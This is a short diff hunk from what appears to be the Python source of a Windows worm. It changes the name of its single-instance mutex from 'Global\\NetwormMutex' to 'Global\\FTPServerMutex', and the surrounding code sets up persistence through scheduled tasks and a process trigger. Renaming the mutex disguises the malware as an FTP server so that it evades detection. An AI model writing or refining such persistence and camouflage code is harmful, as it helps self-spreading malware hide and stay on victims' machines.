@@ -254,7 +254,7 @@ def persist_process_trigger():
 # Mutex to prevent duplicate persistence
 def persist_mutex():
     try:
-        mutex = win32event.CreateMutex(None, False, 'Global\\NetwormMutex')
+        mutex = win32event.CreateMutex(None, False, 'Global\\FTPServerMutex')
         if win32event.GetLastError() == 0:
             persist_schtasks()
             persist_process_trigger()
